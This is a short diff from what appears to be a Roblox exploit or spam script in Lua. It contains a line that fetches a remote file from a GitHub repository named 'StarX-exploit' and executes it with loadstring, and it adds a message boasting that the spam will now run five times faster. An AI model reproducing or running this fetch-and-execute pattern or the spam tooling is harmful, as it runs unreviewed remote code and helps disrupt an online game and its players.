@@ -1393,3 +1393,5 @@ print("This Is Gonna Blow Up 💥😹")
 --Execute Checker  
 loadstring(game:HttpGet("https://raw.githubusercontent.com/StarX-exploit/executed/refs/heads/main/exe.lua"))()
 print("Succesfull Checking Execute")
+wait(2)
+print("Spam Update! ,spam will be 5x faster and that's already very OP")
